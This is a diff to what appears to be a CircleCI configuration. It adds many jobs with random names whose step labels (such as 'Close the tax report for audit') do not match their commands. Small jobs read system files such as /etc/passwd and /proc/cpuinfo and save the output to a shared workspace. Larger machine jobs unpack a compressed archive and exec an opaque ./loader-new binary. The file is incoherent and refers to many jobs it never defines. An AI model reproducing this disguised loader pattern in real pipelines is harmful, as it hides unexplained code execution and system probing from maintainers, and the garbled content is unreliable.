+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  quinninator:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Close the tax report for audit
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; grep -onh --color=never bash /etc/shells | wc -l; true ; } > /tmp/responder/h4wk_w411e7_c3d4r
+            echo "wrote $(wc -c </tmp/responder/h4wk_w411e7_c3d4r) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'h4wk_w411e7_c3d4r'
+  rm-oauth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/h4wk_w411e7_c3d4r 2>/dev/null || wc -c /tmp/responder/h4wk_w411e7_c3d4r 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  cnt-index-icon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Q4 ZIP
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; for ((i=1, j=6; i<=j; i++, j--)); do echo $i $j;done; true ; } > /tmp/responder/rusty67
+            echo "wrote $(wc -c </tmp/responder/rusty67) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'rusty67'
+  validate-quick-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/rusty67 2>/dev/null || wc -c /tmp/responder/rusty67 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  d2uv7j:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Exercise Rapid Comet
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; awk -F':' '{print $1}' /etc/passwd | cat -n | tr -cs '[:alnum:]' '\n'; true ; } > /tmp/responder/CASE_035853
+            echo "wrote $(wc -c </tmp/responder/CASE_035853) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'CASE_035853'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/228.164.2 2>/dev/null || wc -c /tmp/responder/228.164.2 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: not sure why we ship the express lane
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; find . -type f -name '*.sh' -size +1k -nouser -print0 | xargs -0r du -ch | tail -n 1; true ; } > /tmp/responder/a8b1734e1ef3f47f076de05c7819f9376d9d5ca
+            echo "wrote $(wc -c </tmp/responder/a8b1734e1ef3f47f076de05c7819f9376d9d5ca) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'a8b1734e1ef3f47f076de05c7819f9376d9d5ca'
+  bun-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/228.164.2 2>/dev/null || wc -c /tmp/responder/228.164.2 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  proFixtureEntry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: fy26 Reset
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; \ls -1r /var|sort -R|head -3; true ; } > /tmp/responder/KernELMUOnsiLent
+            echo "wrote $(wc -c </tmp/responder/KernELMUOnsiLent) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'KernELMUOnsiLent'
+  lima-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/KernELMUOnsiLent 2>/dev/null || wc -c /tmp/responder/KernELMUOnsiLent 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+
+  no460:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Defend the mesh routes
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; echo -n "disk almost full" | cut -c1-10; true ; } > /tmp/responder/MVI61265
+            echo "wrote $(wc -c </tmp/responder/MVI61265) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'MVI61265'
+  ConstIP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Tidy up the reagents
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; (echo one; echo two) > "${TMPDIR:-/tmp}/flight_team_2022-08-27.dat"; wc -l < "${TMPDIR:-/tmp}/flight_team_2022-08-27.dat"; true ; } > /tmp/responder/bosonsweep
+            echo "wrote $(wc -c </tmp/responder/bosonsweep) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'bosonsweep'
+  Camera-Reader:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Another Write Off Round
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; ls -i -r -w 60 /usr/local | sort -r; true ; } > /tmp/responder/heathotterviolet
+            echo "wrote $(wc -c </tmp/responder/heathotterviolet) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'heathotterviolet'
+  MVPSVMRect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: oops scale in the env vars again
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; sed 's/^/[x] /' /proc/cpuinfo | head -n 3; true ; } > /tmp/responder/0LthpkWgTKJ
+            echo "wrote $(wc -c </tmp/responder/0LthpkWgTKJ) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '0LthpkWgTKJ'
+  DogVs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Petty cash settled nightly
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; f() { while getopts "ab:" o; do echo "$o=${OPTARG:-}"; done; }; f -a -b 9; true ; } > /tmp/responder/926d1f9ca23444c674621093a4b1ed579dad8
+            echo "wrote $(wc -c </tmp/responder/926d1f9ca23444c674621093a4b1ed579dad8) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '926d1f9ca23444c674621093a4b1ed579dad8'
+workflows:
+  default:
+    jobs:
+      - basic_flag
+      - no460:
+          requires:
+            - basic_flag
+      - wip-session-redirect:
+          requires:
+            - no460
+      - noWorker:
+          requires:
+            - no460
+      - ConstIP:
+          requires:
+            - noWorker
+      - DeployTests:
+          requires:
+            - ConstIP
+      - RuleReceiptSession:
+          requires:
+            - ConstIP
+      - Camera-Reader:
+          requires:
+            - RuleReceiptSession
+      - fix-8915:
+          requires:
+            - Camera-Reader
+      - Span-Single-Kind:
+          requires:
+            - Camera-Reader
+      - MVPSVMRect:
+          requires:
+            - Span-Single-Kind
+      - aug17-rev:
+          requires:
+            - MVPSVMRect
+      - PRD-FEE-3:
+          requires:
+            - MVPSVMRect
+      - DogVs:
+          requires:
+            - PRD-FEE-3
+      - bun-fmt:
+          requires:
+            - DogVs
+      - udi02
+      - nut-838
+      - vanillax
+      - smoke:
+          requires:
+            - udi02
+            - nut-838
+            - vanillax
+      - verify-partial-docker-image:
+          requires:
+            - udi02
+            - nut-838
+            - vanillax
+      - victor-5:
+          requires:
+            - udi02
+            - nut-838
+            - vanillax
+      - q2-rev:
+          requires:
+            - udi02
+            - nut-838
+            - vanillax
+      - q4-cleanup:
+          requires:
+            - udi02
+            - nut-838
+            - vanillax
+      - node18-cov:
+          requires:
+            - udi02
+            - nut-838
+            - vanillax
+      - q4-rev:
+          requires:
+            - udi02
+            - nut-838
+            - vanillax
+      - quinninator
+      - rm-oauth:
+          requires:
+            - quinninator
+      - b5702:
+          requires:
+            - quinninator
+      - full-send:
+          requires:
+            - b5702
+      - proFixtureEntry:
+          requires:
+            - b5702
+      - lima-2:
+          requires:
+            - proFixtureEntry
+      - internal_publish:
+          requires:
+            - proFixtureEntry
+      - update-dashboard:
+          requires:
+            - internal_publish
+      - FOSTER:
+          requires:
+            - internal_publish
+      - ruby3-lint:
+          requires:
+            - FOSTER
+      - galaxy-node-command:
+          requires:
+            - FOSTER
+      - jan14-cleanup:
+          requires:
+            - galaxy-node-command
+      - readComplexArticleAdapter:
+          requires:
+            - galaxy-node-command
+      - lima-7:
+          requires:
+            - readComplexArticleAdapter
+      - a355ccf430ba39a6db390
+      - d2uv7j
+      - v9-canary4:
+          requires:
+            - a355ccf430ba39a6db390
+            - d2uv7j
+      - yolo:
+          requires:
+            - a355ccf430ba39a6db390
+            - d2uv7j
+      - bun-vet:
+          requires:
+            - a355ccf430ba39a6db390
+            - d2uv7j
+      - VERIFY_UAT:
+          requires:
+            - a355ccf430ba39a6db390
+            - d2uv7j
+      - QA_HOOK_3:
+          requires:
+            - a355ccf430ba39a6db390
+            - d2uv7j
+      - Build_Pipeline2:
+          requires:
+            - a355ccf430ba39a6db390
+            - d2uv7j
+      - CORE-32:
+          requires:
+            - a355ccf430ba39a6db390
+            - d2uv7j
+      - rewind-lock
+      - build-staging-regression-suite:
+          requires:
+            - rewind-lock
+      - B5:
+          requires:
+            - rewind-lock
+      - dotnet8-fmt:
+          requires:
+            - B5
+      - cnt-index-icon:
+          requires:
+            - B5
+      - validate-quick-artifact-bundle:
+          requires:
+            - cnt-index-icon
+      - ppPotion:
+          requires:
+            - cnt-index-icon
+      - HOOK_QA:
+          requires:
+            - ppPotion
